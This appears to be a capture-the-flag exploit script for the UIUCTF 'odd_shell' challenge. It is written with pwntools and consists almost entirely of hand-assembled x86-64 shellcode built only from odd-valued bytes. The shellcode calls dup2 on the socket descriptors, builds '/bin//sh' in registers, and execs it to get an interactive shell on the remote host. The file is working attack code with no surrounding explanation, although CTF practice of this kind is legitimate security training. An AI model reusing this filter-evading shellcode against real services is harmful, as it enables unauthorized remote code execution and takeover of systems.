from pwn import *
context.log_level = 'debug'
io = remote('odd-shell.chal.uiuc.tf', 1337)

#io = gdb.debug('./odd_shell', gdbscript='b *main+349')
io.recvuntil(':\n')
payload = b""
zero_rdi = b"\x41\x57\x5f" # push r15 (0), pop rdi
zero_rdx = b"\x49\x87\xd5" # xchg r13, rdx
zero_rsi = b"\x49\x87\xf1" # xchg r9, rsi
syscall = b"\x0f\x05"
setup_rax = b"\x49\xC7\xC1\x3B\x3B\x3B\x3B\x49\xC1\xE9\x17\x49\xD1\xE9\x49\x91\x4D\x31\xED\x49\x87\xD5"
"""
mov    r9,0x3b3b3b3b
shr    r9,0x17
shr    r9,1
xchg   r9,rax
xor r13, r13
xchg r13, rdx
"""

bin_sh = b"\x4D\x31\xDB\x49\x87\xCB\x4D\x31\xDB\x49\xFF\xC3\xB5\x67\x49\x87\xCB\x49\xC1\xEB\x07\x49\xD1\xEB\x49\x01\xCB\x49\xC1\xC3\x07\x49\xD1\xC3\x49\xC1\xC3\x17\x49\xD1\xC3\x49\x87\xFB" 
"""
xor r11, r11
xchg r11, rcx
xor r11, r11
inc r11
mov ch, 0x67
xchg r11, rcx
shr r11, 0x7
shr r11, 0x1
add r11, rcx
rol r11, 0x7
rol r11, 0x1
ro1 r11, 0x17
rol r11, 0x1
xchg r11, rdi
"""
# RDI == 0x6800000000

# add 0x732f2f6e to rdi
bin_sh += b"\x49\xC7\xC5\x6D\x2F\x2F\x73\x49\xFF\xC5\x49\x01\xFD\x49\x87\xFD"
"""
mov r13, 0x732f2f6d
inc r13
add r13, rdi
xchg r13, rdi
"""
# RDI now == 0x68732f2f6e


bin_sh += b"\x49\xC7\xC3\x01\x2F\x61\x69\x49\x87\xFD\x49\xC1\xC5\x07\x49\xD1\xC5\x49\xC1\xC5\x07\x49\xD1\xC5\x49\xC1\xC5\x07\x49\xD1\xC5\x49\xC1\xEB\x07\x49\xD1\xEB\x49\xC1\xCB\x07\x49\xD1\xCB\x49\xFF\xC3\x49\xC1\xC3\x07\x49\xD1\xC3\x4D\x01\xDD\x49\x87\xFD"
"""
mov r11, 0x69612f01
xchg r13, rdi
rol r13, 0x7
rol r13, 0x1
rol r13, 0x7
rol r13, 0x1
rol r13, 0x7
rol r13, 0x1
shr r11, 0x7
shr r11, 0x1
ror r11, 0x7
ror r11, 0x1
inc r11
rol r11, 0x7
rol r11, 0x1
add r13, r11
xchg r13, rdi

"""

push_bin_sh = b"\x4D\x31\xED\x41\x55\x57\x49\x89\xE5\x49\x87\xFD"
"""
xor r13, r13
push r13
push rdi
mov r13, rsp
xchg r13, rdi
"""

### We need to call dup2 in order to keep our sockets open
### our newfd should be 0x4

dup_stdin = b"\x4D\x31\xED\x49\x87\xDD\xB3\x03\x49\x87\xDD\x49\xFF\xC5\x49\x87\xF5\x4D\x31\xED\x49\x87\xDD\xB3\x01\x49\x87\xDD\x49\xFF\xCD\x49\x87\xFD\x4D\x31\xED\x49\x87\xD5\x4D\x31\xED\x49\xC7\xC5\x21\x21\x21\x21\x49\xC1\xED\x17\x49\xD1\xED\x49\x95\x0F\x05"


"""
xor r13, r13
xchg r13, rbx
mov bl, 0x03
xchg r13, rbx
inc r13
xchg r13, rsi

xor r13, r13
xchg r13, rbx
mov bl, 0x1
xchg r13, rbx
dec r13
xchg r13, rdi

xor r13, r13
xchg r13, rdx



xor r13, r13
mov r13, 0x21212121
shr r13, 0x17
shr r13, 0x1
xchg r13, rax
syscall
"""


dup_stdout = b"\x4D\x31\xED\x49\x87\xDD\xB3\x03\x49\x87\xDD\x49\xFF\xC5\x49\x87\xF5\x4D\x31\xED\x49\x87\xDD\xB3\x01\x49\x87\xDD\x49\x87\xFD\x4D\x31\xED\x49\x87\xD5\x4D\x31\xED\x49\xC7\xC5\x21\x21\x21\x21\x49\xC1\xED\x17\x49\xD1\xED\x49\x95\x0F\x05"

"""
xor r13, r13
xchg r13, rbx
mov bl, 0x3
xchg r13, rbx
inc r13
xchg r13, rsi

xor r13, r13
xchg r13, rbx
mov bl, 0x1
xchg r13, rbx
xchg r13, rdi

xor r13, r13
xchg r13, rdx



xor r13, r13
mov r13, 0x21212121
shr r13, 0x17
shr r13, 0x1
xchg r13, rax
syscall
"""



dup_stderr = b"\x4D\x31\xED\x49\x87\xDD\xB3\x03\x49\x87\xDD\x49\xFF\xC5\x49\x87\xF5\x4D\x31\xED\x49\x87\xDD\xB3\x01\x49\x87\xDD\x49\xFF\xC5\x49\x87\xFD\x4D\x31\xED\x49\x87\xD5\x4D\x31\xED\x49\xC7\xC5\x21\x21\x21\x21\x49\xC1\xED\x17\x49\xD1\xED\x49\x95\x0F\x05"
"""
xor r13, r13
xchg r13, rbx
mov bl, 0x3
xchg r13, rbx
inc r13
xchg r13, rsi

xor r13, r13
xchg r13, rbx
mov bl, 0x1
xchg r13, rbx
inc r13
xchg r13, rdi

xor r13, r13
xchg r13, rdx



xor r13, r13
mov r13, 0x21212121
shr r13, 0x17
shr r13, 0x1
xchg r13, rax
syscall
"""

payload += dup_stdin + dup_stdout + dup_stderr
payload +=  zero_rdi + zero_rdx + zero_rsi + bin_sh  + push_bin_sh + setup_rax + syscall
#f = open('payload', 'wb')
#f.write(payload)
io.sendline(payload)
io.interactive()
